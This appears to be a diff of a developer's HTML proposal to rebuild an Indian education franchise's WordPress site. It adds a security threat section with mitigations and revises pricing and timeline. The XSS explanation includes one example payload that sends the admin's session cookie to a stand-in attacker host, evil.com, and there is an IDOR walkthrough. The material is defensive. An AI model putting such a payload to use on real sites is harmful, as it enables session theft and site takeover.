+              XSS attacks inject JavaScript into pages that other users then load. There are two types relevant here: <strong>Stored XSS</strong> — an attacker submits a contact form message like <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. If the admin views it in the WordPress dashboard, the script executes in the admin's browser, stealing their session cookie. With that cookie, the attacker logs in as admin. <strong>Reflected XSS</strong> — the URL parameter is printed unsanitized in the page, e.g. <code>richgyan.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>. WordPress has had over 40 confirmed XSS CVEs in Elementor alone since 2020. Your current site has no Content Security Policy header, meaning any injected script runs without restriction.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>Admin session cookie stolen → full site takeover without knowing the password</li>
+              <li>Student portal defaced — fake certificate results, phishing overlays injected</li>
+              <li>Malicious scripts silently loaded by all 50,000+ students visiting the site</li>
+              <li>SEO spam injection — hidden links to pharma sites destroy Google ranking</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li><strong>Content Security Policy (CSP) header</strong> — strict policy blocks inline scripts and limits script sources to our own domain only</li>
+                <li><strong>DOMPurify</strong> on all React/frontend rendering — any user-supplied content sanitized before DOM insertion</li>
+                <li><strong>Server-side HTML encoding</strong> — Jinja2/React escapes <code>&lt; &gt; &amp; " '</code> automatically; no raw HTML rendering of user input</li>
+                <li><strong>httpOnly + Secure session cookies</strong> — even if a script runs, it cannot read the session cookie via JavaScript</li>
+                <li>Response headers: <code>X-Content-Type-Options: nosniff</code>, <code>X-XSS-Protection: 1; mode=block</code>, <code>X-Frame-Options: DENY</code></li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">CSP Header</span>
+              <span class="ttech ttech-green">DOMPurify</span>
+              <span class="ttech ttech-green">Jinja2 Auto-escape</span>
+              <span class="ttech ttech-green">httpOnly Cookies</span>
+              <span class="ttech">Security Headers</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 5. IDOR -->
+        <div class="threat-card" id="tc5">
+          <div class="threat-header" onclick="toggleThreat('tc5')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-high"><i class="ti ti-eye-off"></i></div>
+              <div>
+                <div class="threat-name">Insecure Direct Object References (IDOR)</div>
+                <div class="threat-short">Changing a student ID in a URL to access another student's marks, fees, or personal data</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-high">High</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
+              IDOR occurs when a system uses predictable identifiers (like sequential integers) in URLs or API calls, and doesn't verify that the logged-in user is authorized to access that resource. Example: Student Rahul logs in and sees his fee receipt at <code>/portal/receipt?id=1042</code>. He manually changes it to <code>id=1043</code> and sees another student's payment details. No hacking tool required — just a browser's address bar. This is one of the most common vulnerabilities found in Indian educational portals. In a franchise model like Richgyan, it's even more dangerous — a franchise center owner could access data from another franchise's students by simply incrementing IDs.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>Mass exposure of student personal information to other students or competitors</li>
+              <li>Franchise centers able to view competitor franchise data — business intelligence theft</li>
+              <li>Fee payment receipts of other students accessible — financial privacy violation</li>
+              <li>Exam results of all students accessible before official release</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li><strong>UUIDs instead of sequential integers</strong> for all resource IDs — <code>/receipt/a7f3c2e1-...</code> instead of <code>/receipt/1042</code></li>
+                <li><strong>Server-side ownership checks on every API endpoint</strong> — middleware verifies the JWT user ID matches the requested resource owner before returning any data</li>
+                <li><strong>Franchise-scoped data isolation</strong> — franchise center X can only query students enrolled under their center ID, enforced at the database query level (not just the UI)</li>
+                <li>API design principle: <strong>never trust the client</strong> — every request is re-authenticated against the database, not just the session</li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">UUID Primary Keys</span>
+              <span class="ttech ttech-green">Ownership Middleware</span>
+              <span class="ttech ttech-green">Scoped DB Queries</span>
+              <span class="ttech">Zero Client Trust</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 6. WordPress Plugin CVEs -->
+        <div class="threat-card" id="tc6">
+          <div class="threat-header" onclick="toggleThreat('tc6')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-high"><i class="ti ti-puzzle-off"></i></div>
+              <div>
+                <div class="threat-name">WordPress Plugin &amp; CMS CVE Exploitation</div>
+                <div class="threat-short">Elementor 3.30.2, WooCommerce, and LMS plugins carry known, publicly listed vulnerabilities</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-high">High</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
+              Richgyan India's site runs Elementor 3.30.2 — confirmed via the <code>meta-generator</code> tag. This version number is publicly visible, and attackers use automated scanners (WPScan, Nuclei) to look up this exact version in the CVE database. Elementor has had <strong>47+ confirmed security advisories</strong> since 2021, including RCE (Remote Code Execution), arbitrary file upload, and privilege escalation bugs. WooCommerce and any LMS plugin add further attack surface. Once an attacker knows what version you're running, they can download a pre-built exploit from GitHub and run it in minutes. This is called a <strong>Known Vulnerability Exploitation</strong> attack — it requires no creativity, just a Google search.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>Remote Code Execution — attacker runs arbitrary commands on your server, installing backdoors</li>
+              <li>Arbitrary file upload — malware, web shells uploaded to your hosting</li>
+              <li>Database access via compromised plugin — same as SQL injection, but without needing to inject</li>
+              <li>Site defacement, ransomware installation on server</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li><strong>Migrate entirely off WordPress</strong> — custom Next.js + Flask stack eliminates the entire WordPress CVE attack surface</li>
+                <li><strong>Remove meta-generator tag</strong> — never advertise your tech stack versions in HTML headers</li>
+                <li><strong>Cloudflare WAF</strong> in front of all traffic — blocks known WordPress/WooCommerce exploit patterns even if WordPress is temporarily kept</li>
+                <li><strong>Automated dependency scanning</strong> with GitHub Dependabot — alerts on new CVEs in every package within hours of disclosure</li>
+                <li><strong>No CMS plugins</strong> in the new stack — every feature is purpose-built, minimizing third-party attack surface</li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">Migrate Off WordPress</span>
+              <span class="ttech ttech-green">Cloudflare WAF</span>
+              <span class="ttech ttech-green">Dependabot</span>
+              <span class="ttech">No Meta-Generator</span>
+              <span class="ttech">Minimal Dependencies</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 7. Student PII Data Breach -->
+        <div class="threat-card" id="tc7">
+          <div class="threat-header" onclick="toggleThreat('tc7')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-crit"><i class="ti ti-user-exclamation"></i></div>
+              <div>
+                <div class="threat-name">Student PII Data Breach (DPDP Act 2023 Risk)</div>
+                <div class="threat-short">50,000+ student records with no encryption at rest — a breach means DPDP Act penalties and brand destruction</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-crit">Critical</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
+              Student records in the current WordPress/WooCommerce database include full names, phone numbers, addresses, email IDs, course names, fee payment history, and potentially Aadhaar-linked data. In a typical WordPress setup, this data sits in the <code>wp_users</code>, <code>wp_usermeta</code>, and WooCommerce order tables — <strong>stored in plain text or with only bcrypt on passwords</strong>. If any of the attack vectors above succeed (injection, plugin CVE, brute force), the attacker gets a full PII dump instantly. India's <strong>Digital Personal Data Protection (DPDP) Act 2023</strong> — effective from 2025 — requires mandatory breach notification to the Data Protection Board within 72 hours, and imposes penalties up to <strong>₹250 crore per violation</strong> for significant data fiduciaries managing large-scale student data.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>DPDP Act financial penalties — up to ₹250 crore for large-scale data breach</li>
+              <li>Student data sold on dark web — identity fraud, SIM swap attacks on your students</li>
+              <li>Brand permanently destroyed — parents will not enroll children after a public breach</li>
+              <li>Franchise partners lose confidence and exit the network</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li><strong>AES-256 encryption at rest</strong> for all sensitive PII fields (phone, address, Aadhaar) in PostgreSQL using pgcrypto extension</li>
+                <li><strong>bcrypt (cost factor 12)</strong> for all passwords — even a full DB dump reveals nothing crackable</li>
+                <li><strong>Data minimization</strong> — only collect what's needed; Aadhaar stored as last-4-digits only unless explicitly required</li>
+                <li><strong>DPDP-compliant consent system</strong> — explicit consent checkboxes at enrollment, stored with timestamp and IP</li>
+                <li><strong>Automated daily encrypted backups</strong> to AWS S3 with server-side encryption (SSE-S3)</li>
+                <li><strong>Database activity monitoring</strong> — alerts on bulk SELECT queries (potential data exfiltration attempt)</li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">AES-256 at Rest</span>
+              <span class="ttech ttech-green">bcrypt (cost 12)</span>
+              <span class="ttech ttech-green">pgcrypto</span>
+              <span class="ttech ttech-green">DPDP Consent System</span>
+              <span class="ttech">S3 Encrypted Backup</span>
+              <span class="ttech">DB Activity Monitor</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 8. DDoS & No CDN -->
+        <div class="threat-card" id="tc8">
+          <div class="threat-header" onclick="toggleThreat('tc8')">
+            <div class="threat-header-left">
+              <div class="threat-icon ti-med"><i class="ti ti-cloud-storm"></i></div>
+              <div>
+                <div class="threat-name">DDoS Attacks &amp; No CDN / Rate Limiting</div>
+                <div class="threat-short">A competitor or malicious actor can flood your server with requests and take you offline for days</div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <span class="threat-sev sev-med">Medium</span>
+              <i class="ti ti-chevron-down threat-chevron"></i>
+            </div>
+          </div>
+          <div class="threat-body">
+            <div class="threat-col-title">🔍 How this attack works</div>
+            <div class="threat-explain">
+              A Distributed Denial of Service (DDoS) attack floods a server with more traffic than it can handle, causing legitimate users to get timeouts or errors. In the Indian ed-tech space, DDoS attacks are frequently used by competitors during critical enrollment periods (beginning of academic year, exam result season). Your current setup appears to use shared/VPS hosting with no CDN — meaning all traffic hits your origin server directly. With no rate limiting and no WAF, even a moderate botnet (<strong>5,000 requests/second</strong>) would bring WordPress down. Additionally, without a CDN, your pages load slowly for users in South India or other regions far from the server — hurting both performance and SEO.
+            </div>
+            <div class="threat-col-title">💥 Impact on Richgyan India</div>
+            <ul class="threat-impact">
+              <li>Site goes offline during exam result announcements — peak traffic moment turned into PR disaster</li>
+              <li>Franchise registration portal unavailable during key enrollment windows</li>
+              <li>Google penalizes slow/unreachable sites — SEO ranking drops</li>
+              <li>No rate limiting means brute force, credential stuffing, and scraping run undetected</li>
+            </ul>
+            <div class="threat-solution">
+              <div class="threat-sol-title">✅ Our Solution</div>
+              <ul class="threat-sol-items">
+                <li><strong>Cloudflare Free/Pro tier</strong> in front of all traffic — absorbs DDoS attacks up to terabit scale before they touch your server</li>
+                <li><strong>Cloudflare CDN</strong> caches static assets at 300+ edge locations globally — fast loads from Chennai, Mumbai, Delhi, Northeast India</li>
+                <li><strong>Next.js ISR + Edge caching</strong> — public pages like home, courses, gallery served from cache; zero origin server load</li>
+                <li><strong>Redis rate limiting</strong> on all API endpoints — 100 req/min per IP, with exponential backoff on repeated violations</li>
+                <li><strong>Nginx upstream limits</strong> + connection throttling at the reverse proxy layer</li>
+                <li><strong>Uptime monitoring</strong> with instant Telegram alerts (via your existing bot) if server goes down</li>
+              </ul>
+            </div>
+            <div class="threat-tech-chips">
+              <span class="ttech ttech-green">Cloudflare WAF + DDoS</span>
+              <span class="ttech ttech-green">Cloudflare CDN</span>
+              <span class="ttech ttech-green">Redis Rate Limit</span>
+              <span class="ttech">Nginx Throttle</span>
+              <span class="ttech">Next.js ISR Cache</span>
+              <span class="ttech">Telegram Uptime Alert</span>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- end threat-list -->
+    </div>
+  </div>
+
+  <!-- SCOPE / TABS -->
   <div class="card" id="scope">
     <div class="card-inner">
       <div class="section-label"><i class="ti ti-file-description"></i> Proposal scope</div>
@@ -573,7 +901,7 @@
         <button class="tab-btn" onclick="showPhase('timeline', this)">Timeline</button>
       </div>
 
-      <!-- Frontend -->
+      <!-- FRONTEND -->
       <div id="phase-frontend" class="phase-block active">
         <div class="section-label" style="margin-bottom:.75rem"><i class="ti ti-wand"></i> Frontend redesign — immersive &amp; modern</div>
         <div class="tech-pill-row">
@@ -622,10 +950,10 @@
             <div class="deliv-icon"><i class="ti ti-certificate"></i></div>
             <div class="deliv-title">Interactive certificate portal</div>
             <ul class="deliv-items">
-              <li>Live DB-backed certificate lookup</li>
+              <li>Live DB-backed certificate lookup by UUID</li>
               <li>3D animated certificate reveal on verify</li>
               <li>QR code generation per certificate</li>
-              <li>Employer-facing verification page</li>
+              <li>Employer-facing public verification API</li>
             </ul>
           </div>
           <div class="deliv-card">
@@ -650,7 +978,7 @@
           </div>
         </div>
         <div class="compare-bar">
-          <div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:8px;font-family:var(--font-head)">Before vs after — projected user experience metrics</div>
+          <div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:8px;font-family:var(--font-head)">Before vs after — projected metrics</div>
           <div class="bar-legend">
             <span><span class="leg-dot" style="background:#e24b4a"></span>Current</span>
             <span><span class="leg-dot" style="background:#63991f"></span>Proposed</span>
@@ -659,41 +987,43 @@
           <div class="compare-row"><div class="compare-label">Mobile experience</div><div class="bar-track"><div class="bar-fill-before" style="width:25%"></div></div><div class="bar-track"><div class="bar-fill-after" style="width:90%"></div></div></div>
           <div class="compare-row"><div class="compare-label">Visual appeal</div><div class="bar-track"><div class="bar-fill-before" style="width:20%"></div></div><div class="bar-track"><div class="bar-fill-after" style="width:95%"></div></div></div>
           <div class="compare-row"><div class="compare-label">Certificate trust</div><div class="bar-track"><div class="bar-fill-before" style="width:10%"></div></div><div class="bar-track"><div class="bar-fill-after" style="width:88%"></div></div></div>
+          <div class="compare-row"><div class="compare-label">Security score</div><div class="bar-track"><div class="bar-fill-before" style="width:12%"></div></div><div class="bar-track"><div class="bar-fill-after" style="width:92%"></div></div></div>
           <div class="compare-row"><div class="compare-label">SEO authority</div><div class="bar-track"><div class="bar-fill-before" style="width:35%"></div></div><div class="bar-track"><div class="bar-fill-after" style="width:80%"></div></div></div>
         </div>
       </div>
 
-      <!-- Backend -->
+      <!-- BACKEND -->
       <div id="phase-backend" class="phase-block">
         <div class="section-label" style="margin-bottom:.75rem"><i class="ti ti-server-2"></i> Backend rebuild — secure, scalable, API-first</div>
         <div class="tech-pill-row">
-          <div class="tech-chip highlight">Node.js + Express / Fastify</div>
-          <div class="tech-chip highlight">PostgreSQL</div>
+          <div class="tech-chip highlight">Flask / FastAPI (Python)</div>
+          <div class="tech-chip highlight">PostgreSQL + MongoDB</div>
           <div class="tech-chip highlight">Redis caching</div>
-          <div class="tech-chip highlight">REST + GraphQL API</div>
-          <div class="tech-chip">JWT + OTP auth</div>
-          <div class="tech-chip">AWS S3 / Cloudflare R2</div>
+          <div class="tech-chip highlight">REST API + JWT Auth</div>
+          <div class="tech-chip">Twilio SMS/WhatsApp</div>
+          <div class="tech-chip">Cloudflare WAF</div>
           <div class="tech-chip">Docker + CI/CD</div>
           <div class="tech-chip">Razorpay integration</div>
+          <div class="tech-chip">Cloudinary (media)</div>
         </div>
         <div class="deliverable-grid">
           <div class="deliv-card">
             <div class="deliv-icon"><i class="ti ti-shield-lock"></i></div>
             <div class="deliv-title">Secure auth system</div>
             <ul class="deliv-items">
-              <li>OTP login (Aadhaar-linked option)</li>
-              <li>Role-based access: student / franchise / admin</li>
+              <li>OTP login via Twilio SMS</li>
+              <li>RBAC: student / franchise / admin</li>
               <li>JWT with refresh token rotation</li>
-              <li>Rate limiting &amp; brute-force protection</li>
+              <li>Redis rate limiting + brute-force protection</li>
             </ul>
           </div>
           <div class="deliv-card">
             <div class="deliv-icon"><i class="ti ti-database"></i></div>
             <div class="deliv-title">Certificate DB system</div>
             <ul class="deliv-items">
-              <li>Unique cert IDs linked to student records</li>
-              <li>Tamper-evident hash per certificate</li>
-              <li>Employer public API for batch verification</li>
+              <li>UUID + SHA-256 hash per certificate</li>
+              <li>Tamper-evident: any field change = invalid</li>
+              <li>Employer public verify API</li>
               <li>PDF generation with digital signature</li>
             </ul>
           </div>
@@ -701,20 +1031,20 @@
             <div class="deliv-icon"><i class="ti ti-api"></i></div>
             <div class="deliv-title">Headless API layer</div>
             <ul class="deliv-items">
-              <li>RESTful API for all site content</li>
+              <li>RESTful API for all content + operations</li>
               <li>Franchise management endpoints</li>
               <li>Course enrollment &amp; progress tracking</li>
-              <li>Webhooks for payment events</li>
+              <li>Webhooks for Razorpay payment events</li>
             </ul>
           </div>
           <div class="deliv-card">
             <div class="deliv-icon"><i class="ti ti-cash"></i></div>
             <div class="deliv-title">Payment &amp; franchise billing</div>
             <ul class="deliv-items">
-              <li>Razorpay / PayU integration (INR)</li>
-              <li>Franchise fee collection + receipts</li>
+              <li>Razorpay integration (INR)</li>
               <li>Student fee installment support</li>
-              <li>GST-compliant invoicing</li>
+              <li>GST-compliant auto-invoicing</li>
+              <li>Franchise fee collection + receipts</li>
             </ul>
           </div>
           <div class="deliv-card">
@@ -722,9 +1052,9 @@
             <div class="deliv-title">Franchise network management</div>
             <ul class="deliv-items">
               <li>Center registration &amp; onboarding flow</li>
-              <li>Territory exclusivity enforcement (7km rule)</li>
+              <li>Territory exclusivity enforcement</li>
               <li>Center performance dashboard</li>
-              <li>Bulk SMS/email to franchisees</li>
+              <li>Bulk SMS/email to all franchisees</li>
             </ul>
           </div>
           <div class="deliv-card">
@@ -732,15 +1062,15 @@
             <div class="deliv-title">Infrastructure &amp; monitoring</div>
             <ul class="deliv-items">
               <li>Docker containerized deployment</li>
-              <li>99.9% uptime SLA design</li>
-              <li>Automated backups (daily)</li>
-              <li>Error tracking + performance monitoring</li>
+              <li>Cloudflare WAF + DDoS protection</li>
+              <li>AES-256 encrypted daily backups</li>
+              <li>Telegram uptime alerts + error tracking</li>
             </ul>
           </div>
         </div>
       </div>
 
-      <!-- Mobile -->
+      <!-- MOBILE -->
       <div id="phase-mobile" class="phase-block">
         <div class="section-label" style="margin-bottom:.75rem"><i class="ti ti-device-mobile"></i> Custom mobile app — owned, branded, powerful</div>
         <div class="tech-pill-row">
@@ -780,45 +1110,43 @@
           </div>
           <div class="flag-item">
             <i class="ti ti-check flag-icon" style="color:#63991f"></i>
-            <div class="flag-text">Single React Native codebase = lower long-term maintenance cost<span>One dev team maintains both Android and iOS. No separate Swift/Kotlin builds required.</span></div>
+            <div class="flag-text">Single React Native codebase = lower long-term cost<span>One dev team maintains both Android and iOS. No separate Swift/Kotlin builds required.</span></div>
           </div>
         </div>
       </div>
 
-      <!-- Pricing -->
+      <!-- PRICING -->
       <div id="phase-pricing" class="phase-block">
         <div class="section-label" style="margin-bottom:.75rem"><i class="ti ti-receipt"></i> Investment breakdown</div>
         <div class="info-banner"><strong>Indicative pricing only</strong>All figures in Indian Rupees (₹). Final pricing is subject to a scope confirmation call — modules can be engaged individually if full budget is not immediately available.</div>
         <div class="pricing-row"><span class="price-label">Frontend redesign (Next.js + Three.js + animations)</span><span class="price-val">₹1,80,000 – ₹2,50,000</span></div>
-        <div class="pricing-row"><span class="price-label">Backend rebuild (API + DB + auth + cert system)</span><span class="price-val">₹2,00,000 – ₹3,00,000</span></div>
+        <div class="pricing-row"><span class="price-label">Backend rebuild (API + DB + auth + cert system + security)</span><span class="price-val">₹2,20,000 – ₹3,20,000</span></div>
         <div class="pricing-row"><span class="price-label">Custom mobile app (React Native, Android + iOS)</span><span class="price-val">₹1,50,000 – ₹2,20,000</span></div>
         <div class="pricing-row"><span class="price-label">Franchise portal + dashboard</span><span class="price-val">₹80,000 – ₹1,20,000</span></div>
-        <div class="pricing-row"><span class="price-label">Payment integration (Razorpay/PayU + GST invoicing)</span><span class="price-val">₹40,000 – ₹60,000</span></div>
+        <div class="pricing-row"><span class="price-label">Payment integration (Razorpay + GST invoicing)</span><span class="price-val">₹40,000 – ₹60,000</span></div>
+        <div class="pricing-row"><span class="price-label">Security hardening (WAF, headers, encryption, audit)</span><span class="price-val">₹35,000 – ₹55,000</span></div>
         <div class="pricing-row"><span class="price-label">Domain consolidation + SEO migration</span><span class="price-val">₹20,000 – ₹35,000</span></div>
         <div class="pricing-row"><span class="price-label">Server setup, CI/CD, monitoring (1 yr)</span><span class="price-val">₹60,000 – ₹90,000</span></div>
-        <div class="pricing-row"><span class="price-label price-val" style="font-size:15px">Total (indicative range)</span><span class="price-val total">₹7,30,000 – ₹10,75,000</span></div>
-        <div class="payment-note">
-          <strong>Phased payment structure available</strong>
-          30% on kickoff · 30% at mid-delivery milestone · 30% on launch · 10% post-launch buffer.
-        </div>
+        <div class="pricing-row"><span class="price-label price-val" style="font-size:15px">Total (indicative range)</span><span class="price-val total">₹7,85,000 – ₹11,50,000</span></div>
+        <div class="payment-note"><strong>Phased payment structure available</strong>30% on kickoff · 30% at mid-delivery milestone · 30% on launch · 10% post-launch buffer.</div>
       </div>
 
-      <!-- Timeline -->
+      <!-- TIMELINE -->
       <div id="phase-timeline" class="phase-block">
         <div class="section-label" style="margin-bottom:.75rem"><i class="ti ti-timeline"></i> Delivery timeline (16–20 weeks)</div>
         <div class="tl-item">
           <div class="tl-num">1</div>
           <div class="tl-content">
-            <div class="tl-title">Discovery &amp; architecture</div>
-            <div class="tl-desc">Deep audit of current site, data migration plan, domain consolidation strategy, design direction workshop</div>
+            <div class="tl-title">Discovery &amp; security audit</div>
+            <div class="tl-desc">Deep audit of current site, vulnerability scan, data migration plan, domain consolidation strategy, design direction workshop</div>
             <div class="tl-weeks">Weeks 1–2</div>
           </div>
         </div>
         <div class="tl-item">
           <div class="tl-num">2</div>
           <div class="tl-content">
-            <div class="tl-title">Backend API + database build</div>
-            <div class="tl-desc">PostgreSQL schema, REST/GraphQL API, authentication (OTP + JWT), certificate DB, payment integration</div>
+            <div class="tl-title">Backend API + database + security build</div>
+            <div class="tl-desc">PostgreSQL schema, REST API, OTP auth, JWT rotation, certificate DB, Razorpay, encryption at rest, Cloudflare WAF setup</div>
             <div class="tl-weeks">Weeks 3–7</div>
           </div>
         </div>
@@ -826,7 +1154,7 @@
           <div class="tl-num">3</div>
           <div class="tl-content">
             <div class="tl-title">Frontend development</div>
-            <div class="tl-desc">Next.js site, Three.js hero, 3D image gallery, all page builds, franchise dashboard, certificate portal</div>
+            <div class="tl-desc">Next.js site, Three.js hero, 3D gallery, all page builds, franchise dashboard, certificate portal with live verify</div>
             <div class="tl-weeks">Weeks 5–12 (parallel with backend)</div>
           </div>
         </div>
@@ -841,33 +1169,34 @@
         <div class="tl-item">
           <div class="tl-num">5</div>
           <div class="tl-content">
-            <div class="tl-title">Integration, QA &amp; launch</div>
-            <div class="tl-desc">Full system integration test, cross-device QA, content migration, DNS cutover, go-live monitoring</div>
+            <div class="tl-title">Penetration test, QA &amp; launch</div>
+            <div class="tl-desc">Full OWASP Top 10 penetration test, cross-device QA, content migration, DNS cutover, go-live monitoring</div>
             <div class="tl-weeks">Weeks 16–20</div>
           </div>
         </div>
       </div>
 
-      <!-- CTA -->
-      <div class="cta-bar" id="contact">
-        <div class="cta-text">
-          <strong>Ready to begin?</strong>
-          Schedule a 30-minute scoping call to confirm priorities and finalize a phase-wise plan.
-        </div>
-        <button class="cta-btn" onclick="window.location.href='mailto:?subject=Rich%20Gyan%20India%20-%20Discovery%20Call%20Request'">Draft follow-up email ↗</button>
-      </div>
     </div>
   </div>
 
-  <!-- ─────── FOOTER ─────── -->
+  <!-- CTA -->
+  <div class="cta-bar" id="contact">
+    <div class="cta-text">
+      <strong>Ready to begin?</strong>
+      Schedule a 30-minute scoping call to confirm priorities, review the security audit in detail, and finalize a phase-wise plan.
+    </div>
+    <button class="cta-btn" onclick="window.location.href='mailto:?subject=Rich%20Gyan%20India%20-%20Discovery%20Call%20Request'">Draft follow-up email ↗</button>
+  </div>
+
   <footer>
     <div>
       <div class="footer-brand">Subhajit · <span>Dev</span></div>
-      <div class="footer-copy">Full-Stack Developer · Assam, India · Building AI-powered SaaS for Northeast India</div>
+      <div class="footer-copy">Full-Stack Developer · Aspiring Penetration Tester · Assam, India · Building AI-powered SaaS for Northeast India</div>
     </div>
     <ul class="footer-links">
       <li><a href="https://osubhajit.hashnode.dev" target="_blank">Blog</a></li>
       <li><a href="https://github.com/OSubhajit" target="_blank">GitHub</a></li>
+      <li><a href="https://portfolio-1-8vvr.onrender.com" target="_blank">Portfolio</a></li>
       <li><a href="https://alloy-academy-goalpara-prototype.onrender.com" target="_blank">Demo 1</a></li>
       <li><a href="https://englishschoolprototype.onrender.com" target="_blank">Demo 2</a></li>
     </ul>
@@ -883,9 +1212,13 @@
     btn.classList.add('active');
   }
 
-  function toggleMobileMenu() {
-    // Simple mobile scroll to contact for now
-    document.getElementById('contact').scrollIntoView({ behavior: 'smooth' });
+  function toggleThreat(id) {
+    const card = document.getElementById(id);
+    const isOpen = card.classList.contains('open');
+    // Close all
+    document.querySelectorAll('.threat-card').forEach(c => c.classList.remove('open'));
+    // Toggle clicked
+    if (!isOpen) card.classList.add('open');
   }
 </script>
 </body>
